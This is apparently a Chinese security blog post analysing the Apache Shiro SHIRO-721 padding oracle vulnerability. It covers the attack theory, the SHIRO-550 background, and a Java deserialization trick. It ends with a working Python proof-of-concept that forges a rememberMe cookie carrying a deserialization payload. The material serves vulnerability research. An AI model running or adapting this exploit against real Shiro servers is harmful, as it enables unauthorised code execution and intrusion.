---
layout: post
title:  Shiro Oracle Padding Attack
date: 2019-11-26
categories: 漏洞分析
tags:  HTTP
---

* content
{:toc}

## 简述

自九月 loopx9 在 apache jira 平台上提交漏洞之后就分析了两周，从 [Padding Oracle  Attack 攻击原理](http://netifera.com/research/)，到 shiro 历史漏洞 [SHIRO-550 反序列化利用](https://issues.apache.org/jira/browse/SHIRO-550) ，在有且仅有[有限的消息的情况下](https://issues.apache.org/jira/browse/SHIRO-721)一度认为这是一个假漏洞，直至最后有POC 公布，才恍然大悟，原来在漏洞验证中还有 java 反序列化的 一个技巧，其他的分析文章中却决口不提，也不知道只是拿着 POC 打了一遍，还是大佬们想保留秘密。







## PADDING ORACLE ATTACK 

详细清楚的 Padding ORACLE 攻击相关理论知识可以看文献 [http://netifera.com/research](http://netifera.com/research/), 中文讲解 [http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html](http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html) 

说明：  

其中有一个重要的理论基础：Padding Oracle 攻击是应用/服务 AES 密文 在 Padding（格式） 不对 时能够有明显的区别，通过 Padding 是否正确推断出中间值（每组中间值只和密文一一对应），这样就可以在不用知道 AES 密钥时，构造密文，使之解密为我们想要的明文。

文章 [http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html](http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html) 用例场景是

* 接受到正确的密文之后（填充正确且包含合法的值），应用程序正常返回（200 - OK）。
* 接受到非法的密文之后（解密后发现填充不正确），应用程序抛出一个解密异常（500 - Internal Server Error）。
* 接受到合法的密文（填充正确）但解密后得到一个非法的值，应用程序显示自定义错误消息（200 - OK）

接受到非法的密文之后（解密后发现填充不正确）和 合法的密文（填充正确）但解密后得到一个非法的值 响应不同。


## 历史漏洞 SHIRO-550 

从 Shiro-550 的复现中可以清晰的看到漏洞触发流程。

shiro 使用 CookieRememberMeManager 处理 rememberme 参数  

处理流程  
1. base64 解码
2. 使用 AES 解密
3. 反序列化解密后的字符串

在 1.25 版本以前，使用硬编码存储 AES 密钥，AES 是对称加密算法，拥有密钥之后，通过更改 RememberMe Cookie 值 可以为所欲为。

## SHIRO-721

1.25 版本修复：重点在于随机 AES 密钥，同时也升级了第三方库的版本（反序列化及利用不在本文讨论范围）。

来表达一下为什么我最初判断是假漏洞：

Oracle Padding 攻击是利用侧信道的方式对加密块数据进行渗出

需要条件：  
padding 对，响应1  
padding 不对，响应2  
通过 响应1和响应2 返回不同来区分 padding 是否正确


调试代码
shiro 用 getRememberedPrincipals 函数还原 rememberMe 中的 PrincipalCollection 对象
![enter description here](https://raw.githubusercontent.com/SuperXiaoxiong/SuperXiaoxiong.github.io/master/img/shiro/3.jpg)


在 convertBytesToPrincipals 进行 aes 解密和 反序列化
![enter description here](https://raw.githubusercontent.com/SuperXiaoxiong/SuperXiaoxiong.github.io/master/img/shiro/4.jpg)

报错会调用onRememberedPrincipalFailure，onRememberedPrincipalFailure调用forgetIdentity 
![enter description here](https://raw.githubusercontent.com/SuperXiaoxiong/SuperXiaoxiong.github.io/master/img/shiro/5.jpg)

forgetIdentity 最后会调用 removeFrom
![enter description here](https://raw.githubusercontent.com/SuperXiaoxiong/SuperXiaoxiong.github.io/master/img/shiro/6.jpg)

都会设置 rememberMe 为 deleteMe
所以理论上因为会对解密后的数据进行反序列化，此时触发反序列化报错： 响应1 和 响应2 相同，无法通过 Oracle Padding 攻击达成条件


所以我此刻会认为这是一个假漏洞

### java Trick

观察shiro-721 的漏洞提交，会发现重点 prefix ，有效的 RememberMe cookie 做为 Padding Oracle Attack 的前缀。 

![](https://raw.githubusercontent.com/SuperXiaoxiong/SuperXiaoxiong.github.io/master/img/shiro/1.jpg)

* RememberMe Cookie 的哪一部分做为前缀
* 为什么要做为前缀

最开始读的时候一直没有理解这一点，shiro 是从数据流中读取 iv 的，会在解密时把 第一块字符串（16位）做为 iv，前缀是指 iv 吗？

其实这就涉及到 java 反序列化过程中的一个技巧，** 反序列化数据末尾存在脏数据不会报错 **

这样 通过把已有的 remember cookie 值作为前缀，能够判断解密的 padding 是否正确，进行Oracle Padding 攻击

测试发现：反序列化字符串2 = 反序列化串1 + 数据2    
在反序列化时不会报错  
理论：不是通过0截断导致的，readobject在具体实现中读取到serialdata长度是在serialdata头部约定的。这样就不会报错

最后，通过构造的数据2（因为包含iv，初始向量），直接替换 反序列化字串1，就可以执行payload

## POC

提供一份 shiro Padding Oracle Attack 的测试源码，仅供学习  
VALID_COOKIE_BASE64 初始可以获得的有效 rememberMe cookie  
./poc_urldns_serial_data # java 反序列化 urldns poc  
./rememberMe_poc 可以进行dns请求的poc 数据，以此填充 cookie， RemmeberMe 值

    import base64
    import requests

    VALID_COOKIE_BASE64 = 'MZMoALmwr7GS0f/H9zEg1/TAgPpktI3fNf/rCJVapngx4puR0u2VejMGZM1sfQ48imDucSqHiQOZ7H6lU/zKMTUU3RDFAsk9GV+2pXfhIzL5A1qkQyAqfRANNitznIqrieC3DaDoqpLBwCA2LyLagg4X3/KAI5MqKoN2J5ftxNA84JUe9zhcXf5S3DSDxz4tpI3ojtbr5eFZGdU3t+GNbDpUJKsy8RIt16laDFW27yQL+fLpp5HLXEw0aFMX2HSZQs8sCrYQhcztuN+NEyzQ8DIDtjbVKWTOzq7/tyYz3uG9mgAzsp+rNkXtd4XbRP1WbdiMplkaP1IzZBZppcIL0z8XvazRZ8rIV7hlwYsazOkCYUBFt13DUZszQarCNowH6yQJjWYOFX8R3K2qxuFqJXXzbFQBj1xYRqkXhtd181KMVI1SfAE7IRjUE8432iliIUq2RYea02EBUWVn2yMxqFOJs07a00lv+8tWx8qtyUb+iqYB5IDv9jA/LfCC29TG'

    BLOCK_SIZE = 16
    intermediary = [0] * BLOCK_SIZE

    def stringify(numbers):
        return "".join(map(lambda x: chr(x), numbers))


    def numberify(characters):
        return map(lambda x: ord(x), characters)


    def evil_chain(evil_iv):
        return_str = ''
        for item in evil_iv:
            return_str = return_str + chr(item)
        return return_str

    def count_iv(num):
        if BLOCK_SIZE > (num + 1):
            suffix = BLOCK_SIZE - num - 1
            return_str = []
            for i in range(suffix):
                return_str.append((suffix + 1) ^ intermediary[num + i + 1])
            return return_str
        else:
            return []


    def req(postdata):
        url = 'http://127.0.0.1:8080/account/'
        if '://' not in url:
            target = 'https://%s' % url if ':443' in url else 'http://%s' % url
        else:
            target = url
        base64_ciphertext = base64.b64encode(postdata)
        res = requests.get(target, cookies={'rememberMe': base64_ciphertext.decode()}, timeout=10, allow_redirects=False)
        return res


    def get_intermediary(result, encryped_str):
        try:
            init = [0] * BLOCK_SIZE
            with open('test_file_2', 'w') as f:
                for i in range(BLOCK_SIZE - 1, -1, -1):

                    for pos in range(0, 256):
                        evil_iv = init[0: i] + [pos] + count_iv(i) + encryped_str
                        output = evil_chain(result + evil_iv)
                        res = req(output)
                        if 'rememberMe=deleteMe' not in str(res.headers):
                            intermediary[i] = pos ^ (BLOCK_SIZE - i)

                            break
                f.write(str(intermediary))
        except Exception, e:
            print e


    def padding_text(poc_file):
        with open(poc_file, 'rb') as f:
            poc_text = f.read()
            pad = lambda s: s + ((BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)).encode()
            poc = pad(poc_text)
        return poc


    def run(poc):
        total_num = len(poc) / BLOCK_SIZE
        result = [0] * (total_num + 1) * BLOCK_SIZE
        # result = valid_cookie + iv + padding_oracle_attack
        valid_cookie = numberify(base64.b64decode(VALID_COOKIE_BASE64))
        #result = result + numberify(valid_cookie)
        iv = valid_cookie[:16]
        #first_random_encryted
        for j in range(BLOCK_SIZE):
            result[total_num * BLOCK_SIZE + j] = iv[j]

        for i in range(total_num - 1, -1, -1):

            text = poc[i * BLOCK_SIZE: (i + 1) * BLOCK_SIZE]
            text = numberify(text)

            get_intermediary(valid_cookie, iv)

            for j in range(BLOCK_SIZE):
                iv[j] = text[j] ^ intermediary[j]

            for j in range(BLOCK_SIZE):
                result[(i) * BLOCK_SIZE + j] = iv[j]

        with open('./rememberMe_poc', 'wb') as f:
            f.write(stringify(result))


    if __name__ == '__main__':
        poc = padding_text('./poc_urldns_serial_data')
        run(poc)
        





